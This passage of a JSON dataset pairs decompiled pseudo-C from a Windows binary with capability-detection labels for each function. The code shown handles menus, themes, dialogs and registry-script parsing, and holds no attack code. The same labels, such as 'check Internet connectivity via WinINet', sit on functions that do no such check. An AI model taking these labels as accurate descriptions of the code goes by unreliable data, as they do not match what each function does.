0) && ((_var_10h & 0x600000000) != 0)) && (*var_30h == 0x1313)) {\n                            var_4ch = 0x31;\n                            _var_48h = _var_48h & 0xffffffff00000000 | var_30h[2];\n                            _var_30h = _var_30h & 0xffffffff | var_30h[1] << 0x20;\n                            uVar5 = (*_sym.imp.KERNEL32.dll_lstrlenW)(var_30h[1]);\n                            _var_28h = _var_28h & 0xffffffff00000000 | uVar5;\n                            _var_30h = _var_30h & 0xffffffff00000000;\n                            (*_sym.imp.USER32.dll_SetMenuItemInfoW)(iVar2, iVar7, 1, &lpmii);\n                            fcn.0042fb11(var_30h[1]);\n                            *var_30h = 0x6666;\n                            fcn.0042fafa(var_30h);\n                        }\n                    }\n                    pcVar6 = _sym.imp.USER32.dll_GetMenuItemCount;\n                    iVar7 = iVar7 + 1;\n                    iVar4 = (*_sym.imp.USER32.dll_GetMenuItemCount)(iVar2);\n                } while (iVar7 < iVar4);\n            }\n        }\n    }\n    *arg_14h = 0;\n    return 1;\n}\n",
        "token_count": 1087
    },
    "00409550": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_64h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00409550(char16_t *arg_8h, uint *arg_ch)\n\n{\n    int16_t iVar1;\n    char16_t cVar2;\n    uint32_t uVar3;\n    char16_t *pcVar4;\n    int32_t iVar5;\n    int16_t *piVar6;\n    uint arg_8h_00;\n    char16_t *pcVar7;\n    int32_t iVar8;\n    char16_t *pcVar9;\n    char16_t **in_ECX;\n    int16_t *piVar10;\n    uint unaff_EBX;\n    char16_t *unaff_EDI;\n    code *pcVar11;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    ushort *pv;\n    uint lpCriticalSection;\n    int32_t var_4ch;\n    uint var_47h;\n    uint32_t var_4h;\n    \n    var_4h = *0x6cade0 ^ &stack0xfffffffc;\n    if ((arg_8h == NULL) || (arg_ch == NULL)) {\n        fcn.004303e9(arg_ch);\n        return;\n    }\n    *arg_ch = 0;\n    pcVar4 = arg_8h;\n    do {\n        cVar2 = *pcVar4;\n        pcVar4 = pcVar4 + 1;\n    } while (cVar2 != L'\\0');\n    uVar3 = (pcVar4 - (arg_8h + 1) >> 1) * 2;\n    if (uVar3 < 100) {\n        uVar3 = 1000;\n    }\n    if (uVar3 * 2 >> 0x20 == 0) {\n        pv = (*_sym.imp.ole32.dll_CoTaskMemAlloc)(uVar3 * 2);\n        if (pv != NULL) {\n            *pv = 0;\n            *in_ECX = arg_8h;\n            uVar3 = *0x6cc6d8 << 8;\n            var_47h._0_1_ = *0x6cc6d8;\n            var_4ch = 0;\n            var_47h._1_1_ = '\\0';\n            var_47h._2_1_ = 0;\n            pcVar11 = _sym.imp.USER32.dll_CharNextW;\n            if (*arg_8h == L'\\0') {\ncode_r0x004098cd:\n                *arg_ch = pv;\n                (*_sym.imp.ole32.dll_CoTaskMemFree)(0);\n                fcn.004303e9(unaff_EBX);\n                return;\n            }\n            do {\n                if (uVar3 >> 8 == '\\x01') {\n                    if (var_4ch == 0) {\n                        pcVar4 = fcn.00431048(arg_8h, L\"HKCR\");\n                        if ((pcVar4 != NULL) && (pcVar4 == *in_ECX)) {\n                            pcVar4 = (*pcVar11)(*in_ECX);\n                            *in_ECX = pcVar4;\n                            pcVar4 = (*pcVar11)(pcVar4);\n                            *in_ECX = pcVar4;\n                            pcVar4 = (*pcVar11)(pcVar4);\n                            *in_ECX = pcVar4;\n                            pcVar4 = (*pcVar11)(pcVar4);\n                            *in_ECX = pcVar4;\n                            iVar5 = fcn.00402be0(L\"HKCU\\r\\n{\\tSoftware\\r\\n\\t{\\r\\n\\t\\tClasses\", 0x1f);\n                            if (iVar5 == 0) goto code_r0x004096a3;\n                            var_47h._1_1_ = '\\x01';\n                        }\n                        uVar3 = var_47h._2_1_;\n                    }\n                    if (**in_ECX == L'\\'') {\n                        if (uVar3 == '\\0') {\n                            var_47h._2_1_ = 1;\n                        }\n                        else {\n                            piVar6 = (*pcVar11)(*in_ECX);\n                            if (*piVar6 != 0x27) {\n                                var_47h._2_1_ = 0;\n                                goto code_r0x004096ca;\n                            }\n                            unaff_EDI = (*pcVar11)(*in_ECX);\n                            *in_ECX = unaff_EDI;\n                            iVar5 = fcn.00402be0(unaff_EDI, 1);\n                            if (iVar5 == 0) goto code_r0x004096a3;\n                        }\n                    }\n                    else if (uVar3 == '\\0') {\ncode_r0x004096ca:\n                        if (**in_ECX == L'{') {\n                            var_4ch = var_4ch + 1;\n                        }\n                        else if (((**in_ECX == L'}') && (var_4ch = var_4ch + -1,  var_4ch == 0)) &&\n                                (var_47h._1_1_ == '\\x01')) {\n                            unaff_EDI = L\"\\r\\n\\t}\\r\\n}\\r\\n\";\n                            iVar5 = fcn.00402be0(L\"\\r\\n\\t}\\r\\n}\\r\\n\", 9);\n                            if (iVar5 == 0) goto code_r0x004096a3;\n                            var_47h._1_1_ = '\\0';\n                        }\n                    }\n                }\n                pcVar4 = *in_ECX;\n                if (*pcVar4 == L'%') {\n                    pcVar4 = (*pcVar11)(pcVar4);\n                    *in_ECX = pcVar4;\n                    cVar2 = *pcVar4;\n                    if (cVar2 == L'%') goto code_r0x0040987e;\n                    if ((pcVar4 == NULL) || (cVar2 == L'\\0')) goto code_r0x004097e7;\n                    while (cVar2 != L'%') {\n                        pcVar4 = (*pcVar11)(pcVar4);\n                        cVar2 = *pcVar4;\n                        if (cVar2 == L'\\0') {\n                            (*_sym.imp.ole32.dll_CoTaskMemFree)(pv);\n                            fcn.004303e9(unaff_EBX);\n                            return;\n                        }\n                    }\n                    if (pcVar4 == NULL) goto code_r0x004097e7;\n                    iVar5 = pcVar4 - *in_ECX >> 1;\n                    if (0x1f < iVar5) {\n                        (*_sym.imp.ole32.dll_CoTaskMemFree)(pv);\n                        fcn.004303e9(unaff_EBX);\n                        return;\n                    }\n                    arg_8h_00 = fcn.0043bf88(&var_47h + 3, 0x20, *in_ECX, iVar5);\n                    fcn.00402c90(arg_8h_00);\n                    pcVar9 = in_ECX[1];\n                    pcVar7 = pcVar9 + 8;\n                    (*_sym.imp.KERNEL32.dll_EnterCriticalSection)(pcVar7);\n                    iVar5 = 0;\n                    if (*(pcVar9 + 6) < 1) {\ncode_r0x004097de:\n                        (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(pcVar7);\ncode_r0x004097e7:\n                        (*_sym.imp.ole32.dll_CoTaskMemFree)(pv);\n                        fcn.004303e9(unaff_EBX);\n                        return;\n                    }\n                    while (iVar8 = (*_sym.imp.KERNEL32.dll_lstrcmpiW)(*(*(pcVar9 + 2) + iVar5 * 4), &var_47h + 3), \n                          iVar8 != 0) {\n                        iVar5 = iVar5 + 1;\n                        if (*(pcVar9 + 6) <= iVar5) goto code_r0x004097de;\n                    }\n                    if (iVar5 == -1) goto code_r0x004097de;\n                    if ((iVar5 < 0) || (*(pcVar9 + 6) <= iVar5)) {\n                        fcn.00402f30(0x8000000b);\n                        pcVar11 = swi(3);\n                        (*pcVar11)();\n                        return;\n                    }\n                    piVar6 = *(*(pcVar9 + 4) + iVar5 * 4);\n                    (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(pcVar7);\n                    if (piVar6 == NULL) goto code_r0x004097e7;\n                    piVar10 = piVar6;\n                    do {\n                        iVar1 = *piVar10;\n                        piVar10 = piVar10 + 1;\n                    } while (iVar1 != 0);\n                    iVar5 = fcn.00402be0(piVar6, piVar10 - (piVar6 + 1) >> 1);\n                    pcVar11 = _sym.imp.USER32.dll_CharNextW;\n                    if (iVar5 == 0) goto code_r0x004096a3;\n                    pcVar9 = *in_ECX;\n                    while (pcVar9 != pcVar4) {\n                        pcVar9 = (*pcVar11)(pcVar9);\n                        *in_ECX = pcVar9;\n                    }\n                }\n                else {\ncode_r0x0040987e:\n                    iVar5 = fcn.00402be0(pcVar4, 1);\n                    if (iVar5 == 0) {\ncode_r0x004096a3:\n                        (*_sym.imp.ole32.dll_CoTaskMemFree)(pv);\n                        fcn.004303e9(unaff_EDI);\n                        return;\n                    }\n                }\n                arg_8h = (*pcVar11)(*in_ECX);\n                *in_ECX = arg_8h;\n                if (*arg_8h == L'\\0') goto code_r0x004098cd;\n                uVar3 = CONCAT11(var_47h, var_47h._2_1_);\n            } while( true );\n        }\n    }\n    else {\n        pv = NULL;\n    }\n    (*_sym.imp.ole32.dll_CoTaskMemFree)(pv);\n    fcn.004303e9(unaff_EBX);\n    return;\n}\n",
        "token_count": 2260
    },
    "00409d80": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nbool __cdecl fcn.00409d80(uint arg_8h, int32_t arg_ch, uint arg_10h, uint arg_14h, uint *arg_18h, int32_t arg_1ch)\n\n{\n    int32_t *piVar1;\n    uint uVar2;\n    bool bVar3;\n    char cVar4;\n    int32_t iVar5;\n    int32_t in_ECX;\n    int32_t iVar6;\n    uint var_4h;\n    \n    iVar5 = arg_ch;\n    if (arg_1ch == 0) {\n        if (arg_ch == 0x110) {\n            cVar4 = fcn.00406690();\n            if (cVar4 != '\\0') {\n                piVar1 = in_ECX + 0x38;\n                iVar6 = in_ECX;\n                if (piVar1 == NULL) {\n                    iVar6 = 0;\n                }\n                if (*(in_ECX + 0x3c) != 0) {\n                    if ((*piVar1 != 0) && (iVar5 = (*_sym.imp.UxTheme.dll_CloseThemeData)(*piVar1),  -1 < iVar5)) {\n                        *piVar1 = 0;\n                    }\n                    arg_1ch = *(in_ECX + 0x3c);\n                    uVar2 = *(iVar6 + 4);\n                    cVar4 = fcn.00406690();\n                    if (cVar4 != '\\0') {\n                        iVar5 = (*_sym.imp.UxTheme.dll_OpenThemeData)(uVar2, arg_1ch);\n                        *piVar1 = iVar5;\n                    }\n                }\n                cVar4 = fcn.00406690();\n                iVar5 = arg_ch;\n                if (cVar4 != '\\0') {\n                    (*_sym.imp.UxTheme.dll_EnableThemeDialogTexture)(*(iVar6 + 4), 2);\n                    iVar5 = arg_ch;\n                }\n            }\n            arg_ch = 0;\n            cVar4 = fcn.00406560();\n            if (((cVar4 == '\\0') || (iVar6 = (*_sym.imp.dwmapi.dll_DwmIsCompositionEnabled)(&arg_ch),  iVar6 < 0)) ||\n               (arg_ch == 0)) {\n                bVar3 = false;\n            }\n            else {\n                bVar3 = true;\n            }\n            if (bVar3) {\n                (*_sym.imp.dwmapi.dll_DwmExtendFrameIntoClientArea)(*(in_ECX + 4), in_ECX + 0x44);\n            }\n            *arg_18h = 0;\n        }\n        iVar5 = fcn.00409f80(arg_8h, iVar5, arg_10h, arg_14h, arg_18h, 0);\n        return iVar5 != 0;\n    }\n    return false;\n}\n",
        "token_count": 624
    },
    "00409e90": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00409e90(uint arg_8h, int32_t arg_ch, int32_t arg_10h, int32_t arg_14h, uint *arg_18h, int32_t arg_1ch)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    \n    if (arg_1ch != 0) {\n        return 0;\n    }\n    iVar1 = fcn.0040a1e0(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, 0);\n    if (iVar1 == 0) {\n        if (arg_ch == 5) {\n            if (arg_10h != 1) {\n                fcn.0040dc10(1);\n            }\n            *arg_18h = 1;\n        }\n        else if (arg_ch == 0x4e) {\n            if (*(arg_14h + 8) == -0x342) {\n                fcn.0040dc10(0);\n                *arg_18h = 0;\n                return 1;\n            }\n            if (*(arg_14h + 8) == -0x349) {\n                arg_1ch = 1;\n                uVar2 = fcn.00406e20(arg_10h, arg_14h, &arg_1ch);\n                *arg_18h = uVar2;\n                if (arg_1ch != 0) {\n                    return 1;\n                }\n            }\n        }\n        iVar1 = fcn.0040b340(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, 0);\n        if (iVar1 == 0) {\n            return 0;\n        }\n    }\n    return 1;\n}\n",
        "token_count": 395
    },
    "00409f80": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00409f80(uint arg_8h, int32_t arg_ch, uint wParam, int32_t lParam, uint *arg_18h, int32_t arg_1ch)\n\n{\n    int32_t *piVar1;\n    bool bVar2;\n    char cVar3;\n    int32_t iVar4;\n    uint *puVar5;\n    uint uVar6;\n    int32_t in_ECX;\n    \n    if (arg_1ch == 0) {\n        piVar1 = in_ECX + 0x18;\n        iVar4 = fcn.0040b6e0(arg_8h, arg_ch, wParam, lParam, arg_18h, 0);\n        if (iVar4 != 0) {\n            return 1;\n        }\n        if (arg_ch == 1) {\n            cVar3 = fcn.00406690();\n            if ((cVar3 != '\\0') && (*(in_ECX + 0x1c) != 0)) {\n                if ((*piVar1 != 0) && (iVar4 = (*_sym.imp.UxTheme.dll_CloseThemeData)(*piVar1),  -1 < iVar4)) {\n                    *piVar1 = 0;\n                }\n                uVar6 = *(in_ECX + 0x1c);\n                puVar5 = in_ECX + -0x1c;\n                if (piVar1 == NULL) {\n                    puVar5 = 0x4;\n                }\n                lParam = *puVar5;\n                cVar3 = fcn.00406690();\n                if (cVar3 != '\\0') {\n                    iVar4 = (*_sym.imp.UxTheme.dll_OpenThemeData)(lParam, uVar6);\n                    *piVar1 = iVar4;\n                }\n            }\n            lParam = 0;\n            cVar3 = fcn.00406560();\n            if (((cVar3 == '\\0') || (iVar4 = (*_sym.imp.dwmapi.dll_DwmIsCompositionEnabled)(&lParam),  iVar4 < 0)) ||\n               (lParam == 0)) {\n                bVar2 = false;\n            }\n            else {\n                bVar2 = true;\n            }\n            if (bVar2) {\n                puVar5 = in_ECX + -0x1c;\n                if (in_ECX == 0) {\n                    puVar5 = 0x4;\n                }\n                (*_sym.imp.dwmapi.dll_DwmExtendFrameIntoClientArea)(*puVar5, in_ECX + 0x24);\n                *arg_18h = 0;\n                return 0;\n            }\n        }\n        else {\n            if (arg_ch != 6) {\n                if (arg_ch == 0x31e) {\n                    lParam = 0;\n                    cVar3 = fcn.00406560();\n                    if (((cVar3 == '\\0') ||\n                        (iVar4 = (*_sym.imp.dwmapi.dll_DwmIsCompositionEnabled)(&lParam),  iVar4 < 0)) || (lParam == 0))\n                    {\n                        bVar2 = false;\n                    }\n                    else {\n                        bVar2 = true;\n                    }\n                    if (bVar2) {\n                        puVar5 = in_ECX + -0x1c;\n                        *(in_ECX + 0x24) = *(in_ECX + 0x24);\n                        *(in_ECX + 0x28) = *(in_ECX + 0x28);\n                        *(in_ECX + 0x2c) = *(in_ECX + 0x2c);\n                        *(in_ECX + 0x30) = *(in_ECX + 0x30);\n                        if (in_ECX == 0) {\n                            puVar5 = 0x4;\n                        }\n                        iVar4 = (*_sym.imp.USER32.dll_IsWindow)(*puVar5);\n                        if ((iVar4 != 0) && (cVar3 = fcn.00406560(),  cVar3 != '\\0')) {\n                            (*_sym.imp.dwmapi.dll_DwmExtendFrameIntoClientArea)(*puVar5, in_ECX + 0x24);\n                        }\n                    }\n                    *arg_18h = 0;\n                    return 1;\n                }\n                if (arg_ch == 0x318) {\n                    puVar5 = in_ECX + -0x1c;\n                    if (in_ECX == 0) {\n                        puVar5 = 0x4;\n                    }\n                    uVar6 = (*_sym.imp.USER32.dll_DefWindowProcW)(*puVar5, 0x318, wParam, lParam);\n                    *arg_18h = uVar6;\n                    return 1;\n                }\n                if (arg_ch == 0x14) {\n                    *arg_18h = 1;\n                    return 1;\n                }\n                if (arg_ch == 0xf) {\n                    uVar6 = fcn.00409100(0xf, wParam);\n                    *arg_18h = uVar6;\n                    return 1;\n                }\n                return 0;\n            }\n            lParam = 0;\n            cVar3 = fcn.00406560();\n            if (((cVar3 == '\\0') || (iVar4 = (*_sym.imp.dwmapi.dll_DwmIsCompositionEnabled)(&lParam),  iVar4 < 0)) ||\n               (lParam == 0)) {\n                bVar2 = false;\n            }\n            else {\n                bVar2 = true;\n            }\n            if ((!bVar2) && (*piVar1 != 0)) {\n                puVar5 = in_ECX + -0x1c;\n                if (in_ECX == 0) {\n                    puVar5 = 0x4;\n                }\n                (*_sym.imp.USER32.dll_InvalidateRect)(*puVar5, 0, 0);\n            }\n        }\n        *arg_18h = 0;\n    }\n    return 0;\n}\n",
        "token_count": 1296
    },
    "0040a1e0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040a1e0(uint arg_8h, int32_t arg_ch, uint wParam, int32_t lParam, uint *arg_18h, int32_t arg_1ch)\n\n{\n    int32_t *piVar1;\n    bool bVar2;\n    char cVar3;\n    int32_t iVar4;\n    uint *puVar5;\n    uint uVar6;\n    int32_t in_ECX;\n    \n    if (arg_1ch == 0) {\n        piVar1 = in_ECX + 0x18;\n        iVar4 = fcn.0040b860(arg_8h, arg_ch, wParam, lParam, arg_18h, 0);\n        if (iVar4 != 0) {\n            return 1;\n        }\n        if (arg_ch == 1) {\n            cVar3 = fcn.00406690();\n            if ((cVar3 != '\\0') && (*(in_ECX + 0x1c) != 0)) {\n                if ((*piVar1 != 0) && (iVar4 = (*_sym.imp.UxTheme.dll_CloseThemeData)(*piVar1),  -1 < iVar4)) {\n                    *piVar1 = 0;\n                }\n                uVar6 = *(in_ECX + 0x1c);\n                puVar5 = in_ECX + -0x30;\n                if (piVar1 == NULL) {\n                    puVar5 = 0x4;\n                }\n                lParam = *puVar5;\n                cVar3 = fcn.00406690();\n                if (cVar3 != '\\0') {\n                    iVar4 = (*_sym.imp.UxTheme.dll_OpenThemeData)(lParam, uVar6);\n                    *piVar1 = iVar4;\n                }\n            }\n            lParam = 0;\n            cVar3 = fcn.00406560();\n            if (((cVar3 == '\\0') || (iVar4 = (*_sym.imp.dwmapi.dll_DwmIsCompositionEnabled)(&lParam),  iVar4 < 0)) ||\n               (lParam == 0)) {\n                bVar2 = false;\n            }\n            else {\n                bVar2 = true;\n            }\n            if (bVar2) {\n                puVar5 = in_ECX + -0x30;\n                if (in_ECX == 0) {\n                    puVar5 = 0x4;\n                }\n                (*_sym.imp.dwmapi.dll_DwmExtendFrameIntoClientArea)(*puVar5, in_ECX + 0x24);\n                *arg_18h = 0;\n                return 0;\n            }\n        }\n        else {\n            if (arg_ch != 6) {\n                if (arg_ch == 0x31e) {\n                    lParam = 0;\n                    cVar3 = fcn.00406560();\n                    if (((cVar3 == '\\0') ||\n                        (iVar4 = (*_sym.imp.dwmapi.dll_DwmIsCompositionEnabled)(&lParam),  iVar4 < 0)) || (lParam == 0))\n                    {\n                        bVar2 = false;\n                    }\n                    else {\n                        bVar2 = true;\n                    }\n                    if (bVar2) {\n                        puVar5 = in_ECX + -0x30;\n                        *(in_ECX + 0x24) = *(in_ECX + 0x24);\n                        *(in_ECX + 0x28) = *(in_ECX + 0x28);\n                        *(in_ECX + 0x2c) = *(in_ECX + 0x2c);\n                        *(in_ECX + 0x30) = *(in_ECX + 0x30);\n                        if (in_ECX == 0) {\n                            puVar5 = 0x4;\n                        }\n                        iVar4 = (*_sym.imp.USER32.dll_IsWindow)(*puVar5);\n                        if ((iVar4 != 0) && (cVar3 = fcn.00406560(),  cVar3 != '\\0')) {\n                            (*_sym.imp.dwmapi.dll_DwmExtendFrameIntoClientArea)(*puVar5, in_ECX + 0x24);\n                        }\n                    }\n                    *arg_18h = 0;\n                    return 1;\n                }\n                if (arg_ch == 0x318) {\n                    puVar5 = in_ECX + -0x30;\n                    if (in_ECX == 0) {\n                        puVar5 = 0x4;\n                    }\n                    uVar6 = (*_sym.imp.USER32.dll_DefWindowProcW)(*puVar5, 0x318, wParam, lParam);\n                    *arg_18h = uVar6;\n                    return 1;\n                }\n                if (arg_ch == 0x14) {\n                    *arg_18h = 1;\n                    return 1;\n                }\n                if (arg_ch == 0xf) {\n                    uVar6 = fcn.00409200(0xf, wParam);\n                    *arg_18h = uVar6;\n                    return 1;\n                }\n                return 0;\n            }\n            lParam = 0;\n            cVar3 = fcn.00406560();\n            if (((cVar3 == '\\0') || (iVar4 = (*_sym.imp.dwmapi.dll_DwmIsCompositionEnabled)(&lParam),  iVar4 < 0)) ||\n               (lParam == 0)) {\n                bVar2 = false;\n            }\n            else {\n                bVar2 = true;\n            }\n            if ((!bVar2) && (*piVar1 != 0)) {\n                puVar5 = in_ECX + -0x30;\n                if (in_ECX == 0) {\n                    puVar5 = 0x4;\n                }\n                (*_sym.imp.USER32.dll_InvalidateRect)(*puVar5, 0, 0);\n            }\n        }\n        *arg_18h = 0;\n    }\n    return 0;\n}\n",
        "token_count": 1291
    },
    "0040a440": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040a440(uint noname_0, int32_t arg_ch, uint arg_10h, uint arg_14h, uint *arg_18h, int32_t arg_1ch)\n\n{\n    uint uVar1;\n    \n    if (arg_1ch == 0) {\n        if (arg_ch == 0x14) {\n            *arg_18h = 1;\n            return 1;\n        }\n        if (arg_ch == 0xf) {\n            uVar1 = fcn.00408e60(0xf, arg_10h);\n            *arg_18h = uVar1;\n            return 1;\n        }\n        if (arg_ch == 0x318) {\n            uVar1 = fcn.00408e60(0x318, arg_10h);\n            *arg_18h = uVar1;\n            return 1;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 209
    },
    "0040b290": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nbool __cdecl fcn.0040b290(uint arg_8h, int32_t arg_ch, int32_t arg_10h, int32_t arg_14h, uint *arg_18h, int32_t arg_1ch)\n\n{\n    uint *arg_18h_00;\n    uint uVar1;\n    int32_t iVar2;\n    \n    arg_18h_00 = arg_18h;\n    if (arg_1ch != 0) {\n        return false;\n    }\n    if (arg_ch == 5) {\n        if (arg_10h != 1) {\n            fcn.0040dc10(1);\n        }\n        *arg_18h_00 = 1;\n    }\n    else if (arg_ch == 0x4e) {\n        if (*(arg_14h + 8) == -0x342) {\n            fcn.0040dc10(0);\n            *arg_18h_00 = 0;\n            return true;\n        }\n        if (*(arg_14h + 8) == -0x349) {\n            arg_18h = 0x1;\n            uVar1 = fcn.00406e20(arg_10h, arg_14h, &arg_18h);\n            *arg_18h_00 = uVar1;\n            if (arg_18h != NULL) {\n                return true;\n            }\n        }\n    }\n    iVar2 = fcn.0040b340(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h_00, 0);\n    return iVar2 != 0;\n}\n",
        "token_count": 359
    },
    "0040b9e0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040b9e0(uint arg_8h, int32_t arg_ch, uint arg_10h, uint arg_14h, uint *arg_18h, int32_t arg_1ch)\n\n{\n    uint uVar1;\n    bool bVar2;\n    char cVar3;\n    int32_t iVar4;\n    uint uVar5;\n    int32_t in_ECX;\n    \n    if (arg_1ch != 0) {\n        return 0;\n    }\n    if (arg_ch == 0x110) {\n        cVar3 = fcn.00406690();\n        if (cVar3 != '\\0') {\n            arg_1ch = in_ECX;\n            if (in_ECX + 0x38 == NULL) {\n                arg_1ch = 0;\n            }\n            if (*(in_ECX + 0x3c) != 0) {\n                iVar4 = *(in_ECX + 0x38);\n                if ((iVar4 != 0) && (iVar4 = (*_sym.imp.UxTheme.dll_CloseThemeData)(iVar4),  -1 < iVar4)) {\n                    *(in_ECX + 0x38) = 0;\n                }\n                uVar5 = *(in_ECX + 0x3c);\n                uVar1 = *(arg_1ch + 4);\n                cVar3 = fcn.00406690();\n                if (cVar3 != '\\0') {\n                    uVar5 = (*_sym.imp.UxTheme.dll_OpenThemeData)(uVar1, uVar5);\n                    *(in_ECX + 0x38) = uVar5;\n                }\n            }\n            cVar3 = fcn.00406690();\n            if (cVar3 != '\\0') {\n                (*_sym.imp.UxTheme.dll_EnableThemeDialogTexture)(*(arg_1ch + 4), 2);\n            }\n        }\n        arg_1ch = 0;\n        cVar3 = fcn.00406560();\n        if (((cVar3 == '\\0') || (iVar4 = (*_sym.imp.dwmapi.dll_DwmIsCompositionEnabled)(&arg_1ch),  iVar4 < 0)) ||\n           (arg_1ch == 0)) {\n            bVar2 = false;\n        }\n        else {\n            bVar2 = true;\n        }\n        if (bVar2) {\n            (*_sym.imp.dwmapi.dll_DwmExtendFrameIntoClientArea)(*(in_ECX + 4), in_ECX + 0x44);\n        }\n        *arg_18h = 0;\n    }\n    iVar4 = fcn.00409f80(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, 0);\n    if (iVar4 == 0) {\n        if (arg_ch != 0x110) {\n            if (arg_ch != 0x111) {\n                return 0;\n            }\n            if (arg_10h == 1) {\n                uVar5 = 1;\n            }\n            else {\n                if (arg_10h != 2) {\n                    return 0;\n                }\n                uVar5 = 2;\n            }\n            (*_sym.imp.USER32.dll_EndDialog)(*(in_ECX + 4), uVar5);\n            *arg_18h = 0;\n            return 1;\n        }\n        uVar5 = fcn.00407f90(0x110, arg_10h, arg_14h, &arg_1ch);\n        *arg_18h = uVar5;\n    }\n    return 1;\n}\n",
        "token_count": 796
    },
    "0040c0f0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0040c0f0(uint *arg_8h)\n\n{\n    code *pcVar1;\n    int16_t iVar2;\n    ushort uVar3;\n    uint *in_EAX;\n    int32_t iVar4;\n    uint uVar5;\n    uint uVar6;\n    uint *in_ECX;\n    code *pcVar7;\n    uint var_6ch;\n    uint uStack108;\n    uint uStack104;\n    uint uStack100;\n    uint var_5ch;\n    uint uStack92;\n    uint uStack88;\n    uint uStack84;\n    uint var_4ch;\n    uint uStack76;\n    uint uStack72;\n    uint uStack68;\n    uint var_3ch;\n    uint var_38h;\n    uint uStack56;\n    uint uStack52;\n    uint var_2ch;\n    uint uStack44;\n    uint uStack40;\n    uint uStack36;\n    uint var_1ch;\n    uint uStack28;\n    uint uStack24;\n    uint uStack20;\n    uint var_ch;\n    uint var_8h;\n    uint *var_4h;\n    \n    if (*(in_ECX + 0x10) == 0) {\n        var_4h = in_ECX;\n        (*_sym.imp.KERNEL32.dll_EnterCriticalSection)(0x6c9c60);\n        uVar6 = *0x6cc7e0;\n        if (*(in_ECX + 0x10) == 0) {\n            iVar4 = in_ECX[0xc];\n            if (iVar4 == 0) {\n                uVar5 = *0x6cc7e0;\n                if (in_ECX[0xf] != 0) {\n                    uVar5 = 0;\n                }\n                uVar5 = (*_sym.imp.USER32.dll_LoadCursorW)(uVar5, in_ECX[0xe]);\n                pcVar7 = _sym.imp.USER32.dll_GetClassInfoExW;\n                in_ECX[7] = uVar5;\n            }\n            else {\n                var_8h = in_ECX[10];\n                var_ch = in_ECX[2];\n                var_3ch = 0x30;\n                fcn.00431db0(&var_38h, 0, 0x2c);\n                pcVar7 = _sym.imp.USER32.dll_GetClassInfoExW;\n                iVar4 = (*_sym.imp.USER32.dll_GetClassInfoExW)(uVar6, iVar4, &var_3ch);\n                if (iVar4 == 0) {\n                    iVar4 = (*pcVar7)(0, in_ECX[0xc], &var_3ch);\n                    if (iVar4 == 0) {\n                        (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(0x6c9c60);\n                        return 0;\n                    }\n                }\n                *in_ECX = var_3ch;\n                in_ECX[1] = var_38h;\n                in_ECX[2] = uStack56;\n                in_ECX[3] = uStack52;\n                in_ECX[4] = var_2ch;\n                in_ECX[5] = uStack44;\n                in_ECX[6] = uStack40;\n                in_ECX[7] = uStack36;\n                in_ECX[8] = var_1ch;\n                in_ECX[9] = uStack28;\n                in_ECX[10] = uStack24;\n                in_ECX[0xb] = uStack20;\n                in_ECX[0xd] = in_ECX[2];\n                in_ECX[10] = var_8h;\n                in_ECX[2] = var_ch;\n            }\n            in_ECX[1] = in_ECX[1] & 0xffffbfff;\n            in_ECX[5] = uVar6;\n            iVar4 = in_ECX[10];\n            if (iVar4 == 0) {\n                iVar4 = in_ECX + 0x42;\n                fcn.0040f1b0(iVar4, 